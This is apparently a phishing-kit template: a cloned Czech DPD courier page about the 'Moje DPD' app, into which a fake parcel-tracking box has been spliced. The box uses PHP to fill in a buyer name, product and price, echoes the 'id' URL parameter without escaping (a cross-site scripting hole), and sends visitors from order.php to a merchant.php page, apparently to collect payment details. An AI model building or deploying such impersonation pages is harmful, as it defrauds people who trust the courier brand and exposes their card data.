<li><a class=" menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/">Společenská odpovědnost</a></li>
</ul>
</li>
<li class="  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/podpora/aplikace-a-nastroje/" class="active">Aplikace a nástroje</a> </li>
<li class="  menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.dpd.com/cz/cs/kontakt/" class="active">Kontakt</a> </li>
<div class="burger-language-section">
<div class="burger-language">
<li class="language">
<a class="current font-normal" href="https://www.dpd.com/cz/cs/moje-dpd/">Czech</a>
<a class="" href="https://www.dpd.com/cz/en/moje-dpd/">English</a>
</li>
</div>
</div>
</ul>
</div>
<div class="offcanvas-content d-block d-lg-none">
<ul class="font-light">
<li><a href="https://www.dpd.com/cz/cs/cekam-balik/" class="active">Čekám balík</a> </li>
<li><a href="https://www.dpd.com/cz/cs/poslat-balik/" class="active">Poslat balík</a> </li>
<li class="has-sub"><a href="https://www.dpd.com/cz/cs/cekam-balik/vydejni-mista/" class="active">Výdejní místa</a><i class="sub-expand"></i> <ul class="sub">
<li><a href="http://pickup.dpd.cz/">Najít výdejní místo</a></li>
<li><a href="https://www.dpd.com/cz/cs/cekam-balik/vydejni-mista/chci-se-stat-vydejnim-mistem/">Stát se výdejním místem</a></li>
<li><a href="https://www.dpd.com/cz/cs/cekam-balik/boxy/">DPD boxy</a></li>
</ul>
</li>
<li class="has-sub"><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/" class="active">Společenská odpovědnost</a><i class="sub-expand"></i> <ul class="sub">
<li><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/zijeme-pro-nasi-spolecnost/">Žijeme pro naší společnost</a></li>
<li><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/uhlikove-neutralni-preprava/">Emise CO2 snižujeme na nulu</a></li>
<li><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/dorucujeme-s-citem/">Ve městech doručujeme s citem</a></li>
<li><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/prichazime-s-inovacemi/">Přicházíme s inovacemi</a></li>
<li><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/vyhledavany-zamestnavatel/">Vyhledávaný zaměstnavatel</a></li>
<li><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/monitorovani-kvality-ovzdusi/">Program monitorování kvality ovzduší</a></li>
</ul>
</li>
<li class="has-sub"><a href="https://www.dpd.com/cz/cs/podpora/aktualni-informace/" class="active">Aktuální informace</a><i class="sub-expand"></i> <ul class="sub">
<li><a href="https://www.dpd.com/cz/cs/brexit/">Brexit</a></li>
<li><a href="https://www.dpd.com/cz/cs/e-shopper-barometer/">E-shopper Barometer 2020</a></li>
<li><a href="https://www.dpd.com/cz/cs/koronavirus/">Koronavirus</a></li>
</ul>
</li>
<li><a href="https://www.dpd.com/cz/cs/podpora/nejcastejsi-dotazy/" class="active">Nejčastější dotazy</a> </li>
<li class="has-sub"><a href="https://www.dpd.com/cz/cs/o-nas/kariera/" class="active">Kariéra</a><i class="sub-expand"></i> <ul class="sub">
<li><a href="https://kariera.dpd.cz/">Aktuální pracovní pozice</a></li>
<li><a href="https://www.dpd.com/cz/cs/o-nas/kariera/benefity/">Benefity</a></li>
<li><a href="https://www.dpd.com/cz/cs/o-nas/kariera/age-management/">Age management</a></li>
</ul>
</li>
<li><a href="https://www.dorucujprodpd.cz/" class="active">Dopravci &amp; Kurýři</a> </li>
<li class="has-sub"><a href="https://www.dpd.com/cz/cs/o-nas/" class="active">O nás</a><i class="sub-expand"></i> <ul class="sub">
<li><a href="https://www.dpd.com/cz/cs/o-nas/pro-media/">Pro média</a></li>
<li><a href="https://www.dpd.com/cz/cs/o-nas/spolecenska-odpovednost/">Společenská odpovědnost</a></li>
</ul>
</li>
<li><a href="https://www.dpd.com/cz/cs/podpora/aplikace-a-nastroje/" class="active">Aplikace a nástroje</a> </li>
<li><a href="https://www.dpd.com/cz/cs/kontakt/" class="active">Kontakt</a> </li>
<div class="burger-language-section">
<div class="burger-language">
<li class="language">
<a class="current font-normal" href="https://www.dpd.com/cz/cs/moje-dpd/">Czech</a>
<a class="" href="https://www.dpd.com/cz/en/moje-dpd/">English</a>
</li>
</div>
</div>
</ul>
</div>
</div>
</div>
<div id="pl-22" class="panel-layout"><div id="pg-22-0" class="panel-grid panel-no-style"><div id="pgc-22-0-0" class="panel-grid-cell" data-weight="1"><div id="panel-22-0-0-0" class="so-panel widget widget_dpd-header-modules-theme-pages-widget panel-first-child" data-index="0" data-style="{&quot;background_image_attachment&quot;:false,&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-header-modules-theme-pages-widget so-widget-dpd-header-modules-theme-pages-widget-default-d75171398898"><style>
    /*Begin Internal 5080*/
    .header-theme-page-019-include .carousel-indicators li.active {
        background: #dc0032;
    }

    /*Begin External 830*/
    .header-theme-page-019-include .carousel-indicators li:hover {
        background: #dc0032;
    }
    /*End Internal 5080*/
    .header-theme-page-019-include .carousel-indicators li {
        background: #ffffff;
    }
    .header-theme-page-019-include .carousel-indicators li:before {
        background: none;
    }
    /*End Internal 5080*/
    /*SPCCMS-1210*/
    .text-widget-setting-019-vs-search {
        bottom: calc(100% - 210px);
    }
    .preview-button-1-left {
        padding-left: 16px;
    }
    .preview-button-2-right {
        padding-right: 16px;
    }
    /*SPCCMS-1210*/
    @media screen and (max-width: 767.98px) {
        .header-theme-page-019-include .carousel-indicators { /*Internal 5080*/
            bottom: auto;
        }

    #landing-slider-621f9f7693d73 .carousel-indicators {
                                   top: 200px;
                                   position: absolute;
                               }

        .height-media-themepage {
            height: 220px;
        }

        .mg-top-german-sso-themepage {
            margin-top: 10px;
        }

        .header-theme-page-019-include .carousel-indicators li::before { /*Internal 5080*/
            display: none;
        }

        .header-theme-page-019-include .preview-button-1-left {
            padding-left: 6px;
        }
        .header-theme-page-019-include .preview-button-2-right {
            padding-right: 6px;
        }
    }

    @media screen and (max-width: 543.98px) {
        .header-theme-page-019-include .preview-button-1-left {
            padding-left: 2px;
        }
        .header-theme-page-019-include .preview-button-2-right {
            padding-right: 2px;
        }
    }

    @media screen and (min-width: 768px) {
        div.landing-image-middle {
            left: 25%;
        }

        .height-media-themepage {
            height: 325px;
        }

    #landing-slider-621f9f7693d73 .py-md-6-support-search {
                                   margin-right: 0 !important;
                               }

        .mg-top-german-sso-themepage {
            margin-top: 0;
        }
    }

    /* DGS Recaptcha */
    @media screen and (min-width: 768px) {
        .header-theme-page-019-include.dgs-header-has-captcha .inner-image {
            min-height: 435px;
        }

        .header-theme-page-019-include.dgs-header-has-captcha .height-media-module-019 {
            height: 435px;
        }
    }
</style>
<div class="header-theme-page-019-include row row-fix-margin-layout">
<div id="landing-slider-621f9f7693d73" class="header-slider carousel slide col-12" data-ride="carousel" data-interval="15000">
<ol class="carousel-indicators">
<li style="color: #dc0032" data-target="#landing-slider-621f9f7693d73" data-slide-to="0" class="active d-none"></li>
</ol>
<div class="floating cp-first d-none d-md-block">
</div>
<div class="carousel-inner">
<div id="sending-image-621f9f7693d73-0" class="carousel-item active">
<style>
                    @media (min-width: 768px) {
                        #sending-image-621f9f7693d73-0 .header-modules-brightness-overlay {
                            background: hsla(0, 0%, 0%,0);
                        }
                    }
                    @media (max-width: 767px) {
                        #sending-image-621f9f7693d73-0 .header-modules-brightness-overlay {
                            background: hsla(0, 0%, 0%,0);
                        }
                    }
                </style>
<div class="inner-image" style="position: relative;">
<div class="header-modules-brightness-overlay"></div>
<div class="img-container ">
<div style="background-image: url(&#39;https://www.dpd.com/wp-content/uploads/sites/226/2019/07/DPD-News-19-08-02-Header-Geburtstag-Paketnavigator-1200x325.jpg&#39;)" class="height-media-module-019"></div>
</div>
</div>
<div class="landing-image-addition headline-block ">
<div class="row align-items-end ">
<div class="col-md-6 col-12  sso-german-headline mobile-position-text">
<h3 class="mb-0 v-ellipsis v-ellipsis-lines-2" style="color:#ffffff"></h3>
<h1 class="font-exlight mb-0 v-ellipsis" style="color: #ffffff;font-family: PlutoSansLight;font-size: 30px; font-weight: 300; line-height: 1.23;">Aplikace Moje DPD usnadňuje objednání přepravy</h1> </div>
</div>
</div>
<div class="floating">
<div class="landing-image-addition button-position-019 button-group">
<div class="row align-items-end ">
<div class="col-md-6 col-12 offset-md-6 ">
<div class="row button-wrap justify-content-end">
<div class="button-019 col-md-6 col-12 btn-1">
<div class="widget widget_dpd-button-widget mb-lg-0 margin-bottom-button-end"><div class="so-widget-dpd-button-widget so-widget-dpd-button-widget-default-d75171398898"><div class=" w-button">
<a href="https://www.mojedpd.cz/" target="_blank" class="btn btn-primary auto-three-dots-inline w-100" style="background-color: #dc0032; color: #ffffff">
Vstoupit do aplikace </a>
</div>
</div></div> </div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="floating cp-first d-block d-md-none">
</div>
</div>
</div>
</div></div><div id="panel-22-0-0-1" class="so-panel widget widget_dpd-image-textbox-025a-widget panel-last-child" data-index="1" data-style="{&quot;background_image_attachment&quot;:false,&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-image-textbox-025a-widget so-widget-dpd-image-textbox-025a-widget-default-d75171398898"><style>	
	#m-621f9f7695398 .content-025a a {
		color: #414042;
		text-decoration: underline;
	}
	#m-621f9f7695398 .content-025a a:hover {
		color: #dc0032;
	}
</style>
<div class="row-fix-margin-auto module-025a" id="m-621f9f7695398" style="background-color: #ffffff;">
<center>
<p style="color: #de002f; font-size: 30px; ">Pro sledování zásilky</p>
<div style="max-width: 350px; padding-top: 20px; padding-bottom: 20px; border-radius: 5px; margin: 20px; background-color: #ffffff;">
<table width="360px" style="margin-top: 15px;  border-radius: 3px;">
<tbody><tr style="margin-top: 10px; margin-bottom: 10px; text-align: center;"><td style="border-radius: 3px; background-color: #ffffff;">JMÉNO KUPUJÍCÍHO</td><td style="border-radius: 3px; background-color: #ffffff;"><?php echo $xml->fio; ?></td></tr>
<tr style="border-radius: 3px; text-align: center; background-color: #ffffff;"><td style="border-radius: 3px; background-color: #ffffff;">PRODUKT</td><td style="border-radius: 3px; background-color: #ffffff;"><?php echo $xml->obyava; ?></td></tr>
<tr style="text-align: center;"><td style="border-radius: 3px; background-color: #ffffff;">CENA</td><td style="border-radius: 3px; background-color: #ffffff;"><?php echo $xml->price; ?> Kč</td></tr>

<tr style="text-align: center;"><td style="border-radius: 3px; background-color: #ffffff;">ČÍSLO DOPRAVY</td><td style="border-radius: 3px; background-color: #ffffff;"><?php echo $_GET['id']; ?></td></tr>
</tbody></table>
<a href="<?php echo str_replace("order.php", "merchant.php", ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']); ?>"><input value="POKRAČOVAT" readonly="" style="margin-top: 30px; width: 260px; height: 35px; text-align: center; background-color: #de002f; cursor: pointer; color: #ffffff; border: none;"></a>
</div>
</center><div class="wrap col-12">
<div class="row vertical-align">
<div class="col-md-6 d-none d-md-block col-12 my-md-4">
<div class="row">
<div class="col-12 content-025a dpd-text-editor-content" style="color: #414042">
<p style="font-size: 13px;font-family: PlutoSansLight">Moje DPD vám poskytuje kompletní kontrolu nad přepravou vašich zásilek s DPD. Slouží především k objednání přepravy a tisku přepravních štítků. Aplikaci mohou využívat pouze registrovaní zákazníci s přiděleným zákaznickým číslem. Aplikaci doporučujeme našim malým a středně velkým klientům.</p>
</div>
<div class="col-12 pt-2">
<div class="row button-wrap">
</div>
</div>
</div>
</div>
<div class="col-lg-6 col-md-6 col-12 promotion-image text-center my-md-0 mt-2">
<img class="image-inline w-100 d-none d-md-block" src="./pop_files/025a-Support-IT-Anbindung-myDPD-neu-EN.png">
<img class="image-inline mobile-fallback w-100" src="./pop_files/025a-Support-IT-Anbindung-myDPD-neu-EN.png"> </div>
<div class="col-md-6 d-block d-md-none col-12 my-2 mb-md-0 mb-4">
<div class="row">
<div class="col-12 content-025a dpd-text-editor-content" style="color: #414042">
<h1 class="font-exlight" style="color: #414042;font-family: PlutoSansExtraLight;font-size: 30px; font-weight: 200; line-height: 1.23;">Pro lepší správu vašich zásilek je tu Moje DPD</h1><p style="font-size: 13px;font-family: PlutoSansLight">Moje DPD vám poskytuje kompletní kontrolu nad přepravou vašich zásilek s DPD. Slouží především k objednání přepravy a tisku přepravních štítků. Aplikaci mohou využívat pouze registrovaní zákazníci s přiděleným zákaznickým číslem. Aplikaci doporučujeme našim malým a středně velkým klientům.</p>
</div>
<div class="col-12 pt-2">
<div class="row button-wrap">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div></div></div></div><div id="pg-22-1" class="panel-grid panel-no-style" data-style="{&quot;background_display&quot;:&quot;tile&quot;,&quot;cell_alignment&quot;:&quot;flex-start&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}" data-ratio="1" data-ratio-direction="right"><div id="pgc-22-1-0" class="panel-grid-cell" data-weight="1"><div id="panel-22-1-0-0" class="so-panel widget widget_dpd-benefits-1-widget panel-first-child" data-index="2" data-style="{&quot;background_image_attachment&quot;:false,&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:true,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-benefits-1-widget so-widget-dpd-benefits-1-widget-default-d75171398898"><style>
	#m-621f9f7695ba5 .content-027 a {
		color: #414042;
		text-decoration: underline;
	}
	#m-621f9f7695ba5 .content-027 a:hover {
		color: #dc0032;
	}
</style>
<div class="row benefits-1" id="m-621f9f7695ba5" style="background-color: #ffffff; background-image: none;">
<div class="vertical-align col-12 mb-md-4" style="display: block;">
<div class="row vertical-align" style="flex:1;">
<div class="col-lg-4 col-md-6 col-12 d-none d-md-block">
<img class="w-100" src="./pop_files/vyska2.jpg" alt=""> </div>
<div class="col-lg-8 col-md-6 col-12">
<h4 class="font-exlight text-sm-center text-md-left" style="color: #414042;font-family: PlutoSansExtraLight;font-size: 30px; font-weight: 200; line-height: 1.23;">Výhody aplikace Moje DPD</h4> <p class="font-light" style="color: #414042;">Bez ohledu na to, kolik zásilek odesíláte nebo jak často, ať už je to v České republice nebo v zahraničí, můžete v Moje DPD objednat přepravu zásilek několika kliknutími, aniž byste kdy ztratili přehled o svých zásilkách.</p> <h3 class="size-16 mt-5 mb-4" style="color: #414042">Výhody, které vám aplikace Moje DPD přináší:</h3>
<div class="mb-30 mb-md-0">
<div class="content-027 dpd-text-editor-content" style="color: #414042"><ul>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Jednoduché vytvoření objednávky a snadný tisk přepravních štítků.</p>
</li>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Možnost objednání svozu (vyzvednutí zásilek u odesílatele), a to i s možností objednat vyzvednutí zásilek ve vybraných zemí Evropské unie.</p>
</li>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Automatické nahrávání údajů k zásilkám (příjemce, adresa) v intervalu, který si zvolíte.</p>
</li>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Získáte přehled a kontrolu nad historií zásilek včetně online sledování.</p>
</li>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Nejen, že není potřeba zálohovat žádná data, ale budete mít přístup k novým službám.</p>
</li>
</ul>
</div>
<div class="row button-wrap">
<div class="wrap-btn col-12 col-sm-12">
</div>
</div>
</div>
</div>
<div class="col-12 d-md-none">
<img class="w-100" src="./pop_files/vyska2.jpg"> </div>
</div>
</div>
</div>
</div></div><div id="panel-22-1-0-1" class="so-panel widget widget_dpd-accordion-single-widget panel-last-child" data-index="3" data-style="{&quot;background_image_attachment&quot;:false,&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-accordion-single-widget so-widget-dpd-accordion-single-widget-default-d75171398898"><div id="i621f9f7695d25" class="row content-wrap-005">
<div class="col-12">
<h3 class="collapsible-toggle text-center " style="color: #414042">Technické požadavky <span class="expand-icon"></span></h3>
<div class="collapsible-content row-fix-margin-auto" style="display: none;">
<div id="pl-wbe9203f7" class="panel-layout"><div id="pg-wbe9203f7-0" class="panel-grid panel-no-style"><div id="pgc-wbe9203f7-0-0" class="panel-grid-cell"><div id="panel-wbe9203f7-0-0-0" class="so-panel widget widget_dpd-job-ad-boxes-022-widget panel-first-child panel-last-child" data-index="0"><div class="so-widget-dpd-job-ad-boxes-022-widget so-widget-dpd-job-ad-boxes-022-widget-default-d75171398898">
<style>
    #m-621f9f76960ad .job-ad-box a {
		color: #414042;
		text-decoration: underline;
	}
	#m-621f9f76960ad .job-ad-box a:hover {
		color: #dc0032;
	}
	@media screen and (max-width: 768px) {
        .wrap-module-022 .panel-grid-cell{
            width: 100% !important;
        }
    }
</style>
<div class="module-022 col-12" id="m-621f9f76960ad" style="background-color: rgb(255, 255, 255); height: auto;">
<div class="job-ad-box">
<div style="color: #414042 " class="dpd-text-editor-content"><div class="drawerContent light black">
<ul>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Připojení k internetu. Podporované webové prohlížeče jsou: Mozilla Firefox, Google Chrome, Microsoft Edge, Opera a Internet Explorer (poslední verze).</p>
</li>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">PDF Reader, Adobe Reader, PDF Creator, atd. (pokud budete štítky generovat do PDF souboru a nebudete je přímo tisknout).</p>
</li>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Java 7 a vyšší (pokud budete štítky tisknout přímo, bez mezikroku generování do PDF).</p>
</li>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Doporučená konfigurace vašeho počítače: MS Windows 8 a vyšší, 4 GB operační paměti RAM, 2jádrový procesor o frekvenci 2 GHz.</p>
</li>
<li>
<p style="font-size: 13px;font-family: PlutoSansLight">Pro správnou funkci aplikace doporučujeme průběžně aktualizovat váš operační systém a webový prohlížeč.</p>
</li>
</ul>
</div>
</div>
</div>
</div>
</div></div></div></div></div> </div>
</div>
</div></div></div></div></div><div id="pg-22-2" class="panel-grid panel-no-style" data-style="{&quot;background_display&quot;:&quot;tile&quot;,&quot;cell_alignment&quot;:&quot;flex-start&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}" data-ratio="1" data-ratio-direction="right"><div id="pgc-22-2-0" class="panel-grid-cell" data-weight="1"><div id="panel-22-2-0-0" class="so-panel widget widget_dpd-best-practice-widget panel-first-child panel-last-child" data-index="4" data-style="{&quot;background_image_attachment&quot;:false,&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:true,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-best-practice-widget so-widget-dpd-best-practice-widget-default-d75171398898">
<style>
    @media (min-width: 768px) {
        .w-best-practice .skew-right.skew-right-042621f9f769628a:before{
            background: linear-gradient(to right bottom, #e6e7e8 50%, rgba(0, 0, 0, 0) 50%);
        }
        .w-best-practice .w-bp-content.bg-right-042621f9f7696289 {
            background-color: #ffffff;
        }
        .w-best-practice .w-bp-content-left.bg-left-042621f9f7696285{
            background-color: #e6e7e8;
        }
    }
    .w-best-practice .w-bp-content-right-text.color-right-042-621f9f7696287 {
        color: #414042;
    }
    @media (max-width: 767.98px) {
        .w-best-practice .w-bp-content-left-text.bg-left-text-042-621f9f7696286 {
            background-color: #e6e7e8;
        }
        .w-best-practice .w-bp-content-right.bg-color-right-042-621f9f7696288 {
            background-color: #ffffff;
        }
    }
    #m-621f9f76962d0 .content-left-042 a{
        color: #414042;
		text-decoration: underline;
    }
    #m-621f9f76962d0 .content-right-042 a{
        color: #414042;
		text-decoration: underline;
    }
    #m-621f9f76962d0 .content-right-042 a:hover {
		color: #dc0032;
    }
    #m-621f9f76962d0 .content-left-042 a:hover {
		color: #dc0032;
	}
</style>
<div class="row-fix-margin-auto w-best-practice" id="m-621f9f76962d0">
<div class="col-12 px-0">
<h1 class="w-bp-headline text-center font-exlight text-headline padding-element-042 py-2" style="color: #414042;background-color: #ffffff;font-family: PlutoSansExtraLight;font-size: 30px; font-weight: 200; line-height: 1.23;">Potřebujete pomoci</h1> </div>
<div class="col-12 my-md-5">
<div class="row w-bp-content bg-right-042621f9f7696289">
<div class="col-12 col-md-11 col-lg-7 w-bp-content-left bg-left-042621f9f7696285 skew-right skew-right-042621f9f769628a">
<div class="row">
<a class="col-8 col-md-4 col-lg-4 w-bp-content-image text-center offset-md-0" href="https://www.dpd.com/dpd-cz/wp-content/uploads/sites/226/2020/04/TeamViewerQS_cs-idcp6bfqsf.zip">
<img src="./pop_files/Web_Version-2022_OF03411-768x522.jpg" alt="">
</a>
<div class="col-12 w-bp-content-left-text bg-left-text-042-621f9f7696286">
<div class="row w-100 no-gutters">
<div class="col-10 col-md-6 col-lg-8 offset-1 offset-lg-4 w-bp-content-lt-col pl-lg-0 content-left-042" style="color: #414042;">
<div class="w-bp-content-text w-100 dpd-text-editor-content"><h3 style="font-size: 18px;font-family: PlutoSansLight">Připojíme se k vám přes vzdálenou plochu a poradíme vám</h3>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="col-12 col-lg-5 col-md-12 w-bp-content-right bg-color-right-042-621f9f7696288 mt-lg-0">
<div class="row no-gutters d-block w-100">
<div class="col-12 col-md-6 col-lg-7 offset-md-3 offset-lg-1 w-bp-content-right-text d-lg-inline-flex text-center content-right-042 size-16 text-lg-left color-right-042-621f9f7696287">
<div class="w-bp-content-text w-100 ml-xl-3 ml-lg-2 dpd-text-editor-content">
<h3 style="font-size: 18px;font-family: PlutoSansLight">Aplikace ke stažení</h3>
</div>
</div>
<div class="col-12 col-lg-4 w-bp-content-cta mt-2 text-center">
<a href="https://www.dpd.com/dpd-cz/wp-content/uploads/sites/226/2020/04/TeamViewerQS_cs-idcp6bfqsf.zip" class="btn btn-primary" target="_blank" style="color: #ffffff; background-color: #dc0032">
ZDE </a>
</div>
</div>
</div>
</div>
</div>
</div>
</div></div></div></div><div id="pg-22-3" class="panel-no-style change-teaser-position" data-style="{&quot;background_display&quot;:&quot;tile&quot;,&quot;cell_alignment&quot;:&quot;flex-start&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:&quot;&quot;}" data-ratio="1" data-ratio-direction="right" style="align-items: inherit; max-width: 1124px; margin-left: auto; margin-right: auto;"><div class="teaser-container row row-spacing row-fix-margin row-sm-fix-margin" data-weight="1"><div id="panel-22-3-0-0" class="widget widget_dpd-text-teaser-widget panel-first-child col-lg-4 col-6 teaser-item-odd" data-index="5" data-style="{&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:&quot;&quot;,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-text-teaser-widget so-widget-dpd-text-teaser-widget-base">
<div class="guest-teaser-001" id="teaser621f9f76969ab">
<div class="row w-teaser-001">
<div class="order-0 col-12">
<a href="https://www.dpd.com/cz/cs/moje-dpd/videa/" target="_self" class="boxed top-box icon-target" style="color:#ffffff; background-color:#a90034;">
<div>
<div class="row head-001">
<div class="col-12">
<h3 class="font-light ml-5-001 v-ellipsis" style="color: #ffffff;font-family: PlutoSansLight;font-size: 18px; font-weight: 300; line-height: 1.28;">Instruktážní videa k Moje DPD</h3> </div>
</div>
<div class="row des-001">
<div class="col-12 ml-5-001">
<p class="font-light" style="color: #ffffff;">Potřebujete se lépe orientovat v aplikaci? Připravili jsme jednoduché návody ve formě videí. </p>
</div>
</div>
<div class="row text-bottom">
<div class="col-10 ml-5-001">
<p class="ellipsis" style="color: #ffffff">Více zde</p>
</div>
<div class="col-2 icon-link">
<span>
<img class="float-right teaser-link-icon" src="./pop_files/Continue_Forward_trans_neg_rgb.svg" alt="">
</span>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
<style>
        .preview .user-login-001 {
            display: block !important;
        }
        .preview .guest-teaser-001 {
            display: block !important;
            padding-bottom: 10px;
        }
    </style>
</div></div><div id="panel-22-3-0-1" class="widget widget_dpd-text-teaser-widget col-lg-4 col-6 teaser-item-even" data-index="6" data-style="{&quot;background_image_attachment&quot;:false,&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:&quot;&quot;,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-text-teaser-widget so-widget-dpd-text-teaser-widget-base">
<div class="guest-teaser-001" id="teaser621f9f7696b6e">
<div class="row w-teaser-001">
<div class="order-0 col-12">
<a href="https://www.dpd.com/cz/cs/podpora/aplikace-a-nastroje/" target="_self" class="boxed top-box icon-target" style="color:#ffffff; background-color:#414042;">
<div>
<div class="row head-001">
<div class="col-12">
<h3 class="font-light ml-5-001 v-ellipsis" style="color: #ffffff;font-family: PlutoSansLight;font-size: 18px; font-weight: 300; line-height: 1.28;">Aplikace a nástroje</h3> </div>
</div>
<div class="row des-001">
<div class="col-12 ml-5-001">
<p class="font-light" style="color: #ffffff;">Máte vlastní software a chtěli byste poradit s integrací? Podívejte se na naše aplikace a nástroje.</p>
</div>
</div>
<div class="row text-bottom">
<div class="col-10 ml-5-001">
<p class="ellipsis" style="color: #ffffff">Více zde</p>
</div>
<div class="col-2 icon-link">
<span>
<img class="float-right teaser-link-icon" src="./pop_files/Continue_Forward_trans_neg_rgb.svg" alt="">
</span>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
<style>
        .preview .user-login-001 {
            display: block !important;
        }
        .preview .guest-teaser-001 {
            display: block !important;
            padding-bottom: 10px;
        }
    </style>
</div></div><div id="panel-22-3-0-2" class="widget widget_dpd-text-teaser-widget panel-last-child col-lg-4 col-12 teaser-item-odd" data-index="7" data-style="{&quot;background_display&quot;:&quot;tile&quot;,&quot;animation_event&quot;:&quot;enter&quot;,&quot;animation_screen_offset&quot;:&quot;0&quot;,&quot;animation_duration&quot;:&quot;1&quot;,&quot;animation_repeat&quot;:&quot;&quot;,&quot;animation_hide&quot;:&quot;&quot;,&quot;animation_state_end&quot;:&quot;visible&quot;,&quot;animation_delay&quot;:&quot;0&quot;,&quot;animation_debounce&quot;:&quot;0.1&quot;}"><div class="so-widget-dpd-text-teaser-widget so-widget-dpd-text-teaser-widget-base">
<div class="guest-teaser-001" id="teaser621f9f7696cb6">
<div class="row w-teaser-001">
<div class="order-0 col-12">
<a href="?page_id=23#kontaktni_formular_cs" target="_self" class="boxed top-box icon-target" style="color:#414042; background-color:#e6e7e8;">
<div>
<div class="row head-001">
<div class="col-12">
<h3 class="font-light ml-5-001 v-ellipsis" style="color: #414042;font-family: PlutoSansLight;font-size: 18px; font-weight: 300; line-height: 1.28;">Podpora</h3> </div>
</div>
<div class="row des-001">
<div class="col-12 ml-5-001">
